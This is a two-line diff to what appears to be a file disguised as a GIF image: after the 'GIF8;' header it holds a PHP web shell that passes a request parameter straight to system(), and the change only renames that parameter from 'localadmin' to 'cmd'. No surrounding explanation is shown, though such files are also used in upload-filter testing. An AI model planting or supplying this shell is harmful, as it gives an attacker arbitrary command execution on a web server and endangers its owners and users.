@@ -1,2 +1,2 @@
 GIF8;
-<?php echo system($_REQUEST['localadmin']); ?>
+<?php echo system($_REQUEST['cmd']); ?>
